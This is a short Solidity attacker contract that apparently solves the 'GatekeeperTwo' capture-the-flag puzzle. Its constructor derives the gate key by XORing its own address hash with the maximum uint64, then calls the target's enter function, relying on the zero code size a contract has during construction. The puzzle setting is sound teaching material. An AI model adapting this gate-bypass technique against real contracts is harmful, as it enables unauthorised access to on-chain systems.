// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperTwo.sol";

contract GatekeeperTwoAttacker {

  constructor(address gatekeeperTwo) {
    require(gatekeeperTwo != address(0));
    bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
    GatekeeperTwo(gatekeeperTwo).enter(key);
  }
}
